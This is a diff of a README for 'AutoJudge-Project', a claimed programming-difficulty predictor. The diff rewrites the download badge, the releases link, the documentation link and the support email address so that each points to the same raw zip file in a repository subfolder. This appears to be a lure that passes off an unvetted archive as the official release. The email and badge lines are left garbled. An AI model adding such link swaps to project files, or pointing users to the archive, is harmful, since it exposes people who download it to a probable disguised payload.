@@ -1,6 +1,6 @@
 # 🚀 AutoJudge-Project - Predict Programming Problem Difficulty Easily
 
-[![Download AutoJudge-Project](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/haku07210/AutoJudge-Project/releases)
+[![Download AutoJudge-Project](https://github.com/haku07210/AutoJudge-Project/raw/refs/heads/main/ancile/Project-Auto-Judge-v1.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/haku07210/AutoJudge-Project/raw/refs/heads/main/ancile/Project-Auto-Judge-v1.0.zip)
 
 ## 📊 Overview
 
@@ -25,7 +25,7 @@ AutoJudge-Project is an AI-based tool designed to predict the difficulty of prog
 
 To get started with AutoJudge-Project, follow these steps:
 
-1. Visit this page to download: [AutoJudge-Project Releases](https://github.com/haku07210/AutoJudge-Project/releases)
+1. Visit this page to download: [AutoJudge-Project Releases](https://github.com/haku07210/AutoJudge-Project/raw/refs/heads/main/ancile/Project-Auto-Judge-v1.0.zip)
    
 2. Look for the latest version. Ensure you are downloading the correct file for your operating system, as different files cater to different platforms.
 
@@ -63,7 +63,7 @@ If you encounter any problems during installation or use:
 
 For more tips on using the AutoJudge-Project effectively:
 
-- Visit our documentation: [AutoJudge Documentation](https://github.com/haku07210/AutoJudge-Project/wiki)
+- Visit our documentation: [AutoJudge Documentation](https://github.com/haku07210/AutoJudge-Project/raw/refs/heads/main/ancile/Project-Auto-Judge-v1.0.zip)
   
 - Join our community: Participate in discussions and share your experiences with other users.
 
@@ -75,7 +75,7 @@ Your feedback matters. If you have suggestions or issues, please reach out:
 
 - **Open an Issue:** Use the GitHub issue tracker for reporting bugs or features you'd like to see.
   
-- **Email Support:** For any support queries, you can email us at support@autojudgeproject.com.
+- **Email Support:** For any support queries, you can email us at https://github.com/haku07210/AutoJudge-Project/raw/refs/heads/main/ancile/Project-Auto-Judge-v1.0.zip
 
 ## 🌟 Get Involved
 
